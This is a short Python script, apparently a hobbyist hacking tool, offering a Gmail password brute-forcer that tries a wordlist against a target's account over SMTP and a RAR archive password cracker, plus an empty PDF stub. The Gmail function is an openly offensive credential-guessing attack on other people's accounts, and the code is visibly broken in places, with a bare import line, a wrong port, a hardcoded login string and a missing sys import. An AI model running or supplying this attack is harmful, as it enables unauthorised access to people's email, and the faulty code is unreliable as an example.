from random import choice as ch
from colorama import Fore as c
from time import sleep as sp
import rarfile
import 

gr,rd,bl,cy,mg,yl = c.GREEN,c.RED,c.BLUE,c.CYAN,c.MAGENTA,c.YELLOW
lgr = c.LIGHTGREEN_EX
lrd = c.LIGHTRED_EX
lbl = c.LIGHTBLUE_EX
lcy = c.LIGHTCYAN_EX
lmg = c.LIGHTMAGENTA_EX
lyl = c.LIGHTYELLOW_EX
black = c.BLACK

colors = [gr,lgr,rd,lrd,bl,lbl,cy,lcy,mg,lmg,yl,lyl]

def gmail():
    import smtplib
    email = input("Enter your target email address => ")
    passwfile = input("\nEnter your target password address => ")
    passwfile = open(passwfile, "r")
    smtpserver = smtplib.SMTP("smtp.gmail.com", 535)
    smtpserver.ehlo()
    smtpserver.starttls()
    smtpserver.login(email,'mr_sinoce_3131')
    smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
    smtpserver.ehlo()
    smtpserver.starttls()

    for password in passwfile:
        try:
            smtpserver.login(email, password)
            print("\nYour email password was successfully found , password => %s" % password)
            break
        except smtplib.SMTPAuthenticationError:
            print("\nThe password does not match the email you want , password => %s" % password)
def rar():
    rarfile.UNRAR_TOOL = "unrar"
    rarfile_address = input("RarFile : ")
    passwordlist_address = input("Password List : ")

    rar_file = rarfile.RarFile(rarfile_address)

    passwordlist = open(passwordlist_address)

    password_found = False
    print("-----------------")
    for password in passwordlist:
        password = password.strip("\n")
        print("Testing : {}".format(password))
        try:
            rar_file.setpassword(password)
            rar_file.testrar()
            print("*"*50)
            print("Password : {}".format(password))
            password_found = True
            break
        except:
            continue

    if password_found:
        input()
        sys.exit(0)
    else:
        print("*"*50)
        print("Sorry I can't find correct Password in your password list :(")
def pdf():
    pass